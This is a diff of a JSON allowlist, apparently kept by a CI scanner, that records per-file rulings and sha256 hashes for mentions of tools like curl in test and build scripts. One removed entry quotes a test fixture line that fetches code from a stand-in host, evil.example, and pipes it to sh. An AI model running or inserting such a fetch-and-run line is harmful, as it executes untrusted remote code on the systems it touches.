@@ -430,27 +430,17 @@
     {
       "file": ".github/agent/supply-chain/pin-age-check.py",
       "ruling": "text, not a command: Python source of .github/agent/supply-chain/pin-age-check.py (python runs it, no shell reads it): reads registry, index, GitHub and Rekor APIs for a pin's age and signature | text, not a command: Python source of .github/agent/supply-chain/pin-age-check.py (python runs it, no shell reads it): a string, name or docstring that mentions the tool, no request is made | text, not a command: a comment in .github/agent/supply-chain/pin-age-check.py that names the tool",
-      "body-sha256": "f3b4f738cf36d4dd0a7b4c5500c43ea84ce18aadbfa21f731372bcb8dc4a3684"
+      "body-sha256": "568249d98697915a6f84e23fe13c892707c42dcd2606214ed62c1813d5fbf271"
     },
     {
       "file": ".github/agent/supply-chain/pin-audit.py",
       "ruling": "text, not a command: Python source of .github/agent/supply-chain/pin-audit.py (python runs it, no shell reads it): reads the OSV API for advisories",
-      "body-sha256": "b1a2497774327c44a5a4fdef8c48f69070310dd4963902ad8af46db0338eb310"
+      "body-sha256": "cab28dee933d3276e68ed354f7854ac1691b95a5011672c712364c0d1934299f"
     },
     {
       "file": ".github/agent/supply-chain/pin-inventory.py",
       "ruling": "text, not a command: Python source of .github/agent/supply-chain/pin-inventory.py (python runs it, no shell reads it): a string, name or docstring that mentions the tool, no request is made | text, not a command: the tuple of client module names in .github/agent/supply-chain/pin-inventory.py (data; it runs nothing)",
-      "body-sha256": "c84621ac26bc6f6483900ab835ca7a8f2db62edf1a866f314f8e7257a5823b8b"
-    },
-    {
-      "file": ".github/agent/tests/auditor-matrix-test.sh",
-      "ruling": "text, not a command: a line of a quoted here-document in .github/agent/tests/auditor-matrix-test.sh (data for python or a fixture, nothing the shell runs), bound by the sha256 of the whole body | text, not a command: a line of .github/agent/tests/auditor-matrix-test.sh that holds the fixture text of a case inside quotes, or a case pattern naming test cases; the shell runs none of it as the tool (checked with a quote-aware scan of the file)",
-      "body-sha256": "f3ec59e4a3040c36e60e45e19e6cfc7227ae264e2fe70428ebb3bd608247a6b6"
-    },
-    {
-      "file": ".github/agent/tests/check-action-pins-test.sh",
-      "ruling": "text, not a command: a comment in .github/agent/tests/check-action-pins-test.sh that names the tool | text, not a command: a line of a quoted here-document in .github/agent/tests/check-action-pins-test.sh (data for python or a fixture, nothing the shell runs), bound by the sha256 of the whole body | text, not a command: a line of .github/agent/tests/check-action-pins-test.sh that holds the fixture text of a case inside quotes, or a case pattern naming test cases; the shell runs none of it as the tool (checked with a quote-aware scan of the file)",
-      "body-sha256": "95881a709eb142f06c863f14828edc9b5212b89620fa3e09404123ab4f516326"
+      "body-sha256": "395dd4cb43491371bacda54fcef879c7f9fa22a58aeacd31d813eda04dfbbe97"
     },
     {
       "file": ".github/agent/tests/docs-snippets-test.sh",
@@ -463,24 +453,9 @@
       "body-sha256": "ee7fcb479feebb227278e22df7336444e361e73c6d64836ef7056864be2afe0e"
     },
     {
-      "file": ".github/agent/tests/pin-age-check-test.sh",
-      "ruling": "text, not a command: a line of a quoted here-document in .github/agent/tests/pin-age-check-test.sh (data for python or a fixture, nothing the shell runs), bound by the sha256 of the whole body | text, not a command: a comment in .github/agent/tests/pin-age-check-test.sh that names the tool | text, not a command: a line of .github/agent/tests/pin-age-check-test.sh that holds the fixture text of a case inside quotes, or a case pattern naming test cases; the shell runs none of it as the tool (checked with a quote-aware scan of the file) | text, not a command: a line of .github/agent/tests/pin-age-check-test.sh that holds the fixture text of a case inside quotes, or a case pattern naming test cases; the shell runs none of it as the tool",
-      "body-sha256": "89552c4a2cf4d759fee7160466ed424e5aa2a3df1cd12e6d9da9a438d1ca342d"
-    },
-    {
       "file": ".github/agent/tests/pin-audit-go-major-test.sh",
       "ruling": "text, not a command: a line of a quoted here-document in .github/agent/tests/pin-audit-go-major-test.sh (data for python or a fixture, nothing the shell runs), bound by the sha256 of the whole body",
       "body-sha256": "39151fc73c55b5582000fdede799b75aba6472d6ad1c925697ca2db24bb677ff"
-    },
-    {
-      "file": ".github/agent/tests/pin-audit-test.sh",
-      "ruling": "text, not a command: a line of a quoted here-document in .github/agent/tests/pin-audit-test.sh (data for python or a fixture, nothing the shell runs), bound by the sha256 of the whole body | text, not a command: a line of .github/agent/tests/pin-audit-test.sh that holds the fixture text of a case inside quotes, or a case pattern naming test cases; the shell runs none of it as the tool (checked with a quote-aware scan of the file)",
-      "body-sha256": "367eea69f6ae94dff8d0441a3d2a72ac25e887d5d380806a14a140708e8daae0"
-    },
-    {
-      "file": ".github/agent/tests/pin-wiring-test.sh",
-      "ruling": "text, not a command: a line of a quoted here-document in .github/agent/tests/pin-wiring-test.sh (data for python or a fixture, nothing the shell runs), bound by the sha256 of the whole body",
-      "body-sha256": "a63061c01fb86dca23baae0adb379160b024a80b2af559d4225203c006cb5ed1"
     },
     {
       "file": ".github/agent/tests/pip-pin-test.sh",
@@ -490,32 +465,17 @@
     {
       "file": ".github/agent/tests/s2-p2-gh-404-test.sh",
       "ruling": "text, not a command: a line of .github/agent/tests/s2-p2-gh-404-test.sh that holds the fixture text of a case inside quotes, or a case pattern naming test cases; the shell runs none of it as the tool (checked with a quote-aware scan of the file)",
-      "body-sha256": "b0c76ff4006774c811fc56e31996cc1a075fc7d050abb4ce45de47ea8f465df2"
+      "body-sha256": "c985e0cce2b78c06c270620a2ba41750009ea436998cc905edd26416d649bacc"
     },
     {
       "file": ".github/agent/tests/s2-p2-strict-lookups-test.sh",
       "ruling": "text, not a command: a line of a quoted here-document in .github/agent/tests/s2-p2-strict-lookups-test.sh (data for python or a fixture, nothing the shell runs), bound by the sha256 of the whole body | text, not a command: a comment in .github/agent/tests/s2-p2-strict-lookups-test.sh that names the tool",
-      "body-sha256": "e3173c464e0b4e1f296d679f2b3e143ab5be9832628c7d4e677b016f73c9b0b7"
+      "body-sha256": "0ef9f41852581d875ca9d10abdd5ca7c22cf0403c93b8f4587956a32c8f38b73"
     },
     {
       "file": "bin/acceptance-k8s-smoke.py",
       "ruling": "text, not a command: a comment in bin/acceptance-k8s-smoke.py that names the tool | text, not a command: Python source of bin/acceptance-k8s-smoke.py (python runs it, no shell reads it): a string, name or docstring that mentions the tool, no request is made",
       "body-sha256": "a49d28aff8695aef6d7a7685291422cbb9b8b8347aaa3ed997ed925e16069cfb"
-    },
-    {
-      "file": "bin/build-helpers-test.sh",
-      "ruling": "text, not a command: a negative-test fixture; printf appends the YAML text '- runs: | curl -s https://evil.example/x | sh' to two copies of a generated recipe so the same-step case proves the comparison still sees a difference; the recipe is compared, never run",
-      "body-sha256": "8745c02a4a1e50bd3208a575287c5869bbe221026ab966fa03c67cb0bf4ad246"
-    },
-    {
-      "file": "bin/chain-build-admit-test.sh",
-      "ruling": "text, not a command: the text sits inside a quoted variable assignment; it is stored, compared or handed to a judge as fixture text",
-      "body-sha256": "8a9c97baff7daf32968497fded21722542b4f28b56235001b9cb8829390f27fe"
-    },
-    {
-      "file": "bin/chain-build-wiring-test.sh",
-      "ruling": "text, not a command: a string constant or comment in a Python program run from a quoted heredoc (checker context pystring, ast-strings-only); that program also runs subprocesses or writes files, so the claim that it only reads this text rests on review | text, not a command: curl appears only inside a Python string literal that the test evaluates as Python; it is never run as a shell command | text, not a command: the text sits inside a quoted variable assignment; it is stored, compared or handed to a judge as fixture text",
-      "body-sha256": "4898b97162568ef69ca174d9b03cbbd5304937d8b2cbeb0491829af52b7122ce"
     },
     {
       "file": "bin/chain-check-scripts-test.sh",
@@ -528,19 +488,9 @@
       "body-sha256": "a351198c2b3ca71d5f9a78abe34e0a2ed7367567964884c1badac9bab3f7347a"
     },
     {
-      "file": "bin/chain-hostile-test.sh",
-      "ruling": "text, not a command: the value of a plain assignment (a description or data string); nothing runs it",
-      "body-sha256": "ee03279562b27fa82fed17cd704c9933109a46d337c623bae531588fc1594854"
-    },
-    {
       "file": "bin/chain-install-crane-test.sh",
       "ruling": "text, not a command: a comment in the script; nothing runs it | text, not a command: the name or path of a fake curl that the test writes and runs; it fetches nothing (no network)",
       "body-sha256": "2b18c21a9226c2e90f36d9649e3b505a0fe256c5566b4b2737002f64a16a7fea"
-    },
-    {
-      "file": "bin/chain-install-witness-test.sh",
-      "ruling": "text, not a command: a comment in the script; nothing runs it | text, not a command: the name or path of a fake curl that the test writes and runs; it fetches nothing (no network)",
-      "body-sha256": "6235679b0932f7027751fadc76379858a7190c3b1be9c7c092e867f6427338b4"
     },
     {
       "file": "bin/chain-release-scripts-test.sh",
@@ -568,24 +518,9 @@
       "body-sha256": "cf39f9e9e18f0af6804e1714a5c60f1f7bcb38cadb6a0f1710522fb5d0d64516"
     },
     {
-      "file": "bin/chain-verify-test.sh",
-      "ruling": "text, not a command: a comment in the script; nothing runs it | text, not a command: data in a quoted heredoc fed to cat, written to a file the script only reads; nothing runs it",
-      "body-sha256": "068098bc5e404b1ed022413e28f3e4aec3274fd08acef4bb03ae9fe34619ab2a"
-    },
-    {
       "file": "bin/chain-verify.py",
       "ruling": "text, not a command: Python source of bin/chain-verify.py (python runs it, no shell reads it): reads and queries the Rekor transparency log",
       "body-sha256": "171ba2954b66c4683331189d0ef53352949edd3b41a5283b15f24c27cba93677"
-    },
-    {
-      "file": "bin/go-bump-open-pr-test.sh",
-      "ruling": "text, not a command: the name or path of a fake curl that the test writes and runs; it fetches nothing (no network)",
-      "body-sha256": "18e543a392b7c1cee61275da275d6c01f417dee73f7d2cc00e513252412056d0"
-    },
-    {
-      "file": "bin/inspector-reuse-test.sh",
-      "ruling": "text, not a command: a package name and version (curl@8.0) in a plain variable assignment, passed to the SBOM fixture builder; nothing downloads it",
-      "body-sha256": "14ff1f1a2f11e67816e2c09e7929f22d84699e56c61821983c5e89e4986347c2"
     },
     {
       "file": "bin/loopback-get-test.sh",
@@ -598,21 +533,6 @@
       "body-sha256": "e3d4213d91beed11740880638ff36f755a6d9752719ec8c883309a6557ee0106"
     },
     {
-      "file": "bin/melange-apko-lib.sh",
-      "ruling": "text, not a command: the first line of the curl STUB's body (written as data by a quoted heredoc); it echoes the word curl and its arguments into the call log, it downloads nothing | text, not a command: Python inside the test library heredoc; the string 'curl ' is one of the forbidden fragments the mel-env check asserts is ABSENT from the melange recipe's text | text, not a command: Python inside the test library heredoc; asserts the package name wget is listed in the recipe's environment (an assertion message, nothing is fetched) | text, not a command: a shell comment explaining that tools such as curl are replaced by STUBS on PATH that record their argv in a call log | text, not a command: the curl STUB's error branch (written as data by a quoted heredoc); echoes 'stub curl: 22 <url>' to stderr and exits 22, it downloads nothing | text, not a command: a shell comment describing what the build helper does ('archives new packages by digest into ARCHIVE/<arch>/ (curl)') | text, not a command: Python inside the test library heredoc; the ENVPK fixture list of apk package names and versions (busybox, git, wget, ca-certificates-bundle) | text, not a command: Python inside the test library heredoc; asserts the package names git, busybox, ca-certificates-bundle and wget are in the recipe's environment | text, not a command: opens the quoted heredoc that writes the curl STUB (a file named curl in the stubs directory) as data; the stub records its argv and serves local fixture files",
-      "body-sha256": "ec4ba9a8fcb0db2bf66ee9d2a834c46c4d38c55c32b607117f244b7d04319562"
-    },
-    {
-      "file": "bin/persona-uat-agent-test.sh",
-      "ruling": "text, not a command: data in a quoted heredoc fed to cat, written to a file the script only reads; nothing runs it | text, not a command: a string constant or comment in a Python program the test runs from a quoted heredoc (checker context pystring, ast-strings-only); that program also runs subprocesses or writes files, so the claim that it only reads this text rests on review | text, not a command: the value of a plain assignment in the test (a description or data string); nothing runs it",
-      "body-sha256": "25bd1599591ca76c6f8c3201d39702378cc2e7d7b73d021dbe1b459f368529c9"
-    },
-    {
-      "file": "bin/persona-uat-test.sh",
-      "ruling": "text, not a command: a comment in the test; nothing runs it | text, not a command: a string constant or comment in a Python program the test runs from a quoted heredoc (proved by the checker: context pystring); the program does not execute it | text, not a command: the value of a plain assignment in the test (a description or data string); nothing runs it | text, not a command: data in a quoted heredoc fed to cat, written to a file the script only reads; nothing runs it | text, not a command: a string constant or comment in a Python program the test runs from a quoted heredoc (checker context pystring, ast-strings-only); that program also runs subprocesses or writes files, so the claim that it only reads this text rests on review",
-      "body-sha256": "3bcdbdb7fd8faa8c03c370d930df35530040ead012b21017d8b2f520a7c9ebe3"
-    },
-    {
       "file": "bin/persona-uat-wiring-test.sh",
       "ruling": "text, not a command: a comment in the test; nothing runs it | text, not a command: a string constant or comment in a Python program the test runs from a quoted heredoc (checker context pystring, ast-strings-only); that program also runs subprocesses or writes files, so the claim that it only reads this text rests on review",
       "body-sha256": "87049d55fbb8c0139932d5f52b111f91d08d4d8c916a479872344128ca42eab5"
@@ -621,11 +541,6 @@
       "file": "bin/persona-uat.py",
       "ruling": "text, not a command: Python source of bin/persona-uat.py (python runs it, no shell reads it): probes a local endpoint and asks the Actions identity-token endpoint | text, not a command: Python source of bin/persona-uat.py (python runs it, no shell reads it): a string, name or docstring that mentions the tool, no request is made",
       "body-sha256": "aaa4e5c03dfd2c252681beb8b78eac44a487b8b35436cc07187d6517baf3472d"
-    },
-    {
-      "file": "bin/refresh-inputs-test.sh",
-      "ruling": "text, not a command: the one line of the refresh test that names the fetch tool, a printf -v of a constant word; every other line of the suite uses the variable; handoff 0432",
-      "body-sha256": "eb798199d56e9378c637990ffb6dcbc5ff112753ec48273094ac43a6ccd0bc0f"
     },
     {
       "file": "bin/release-postverify.py",
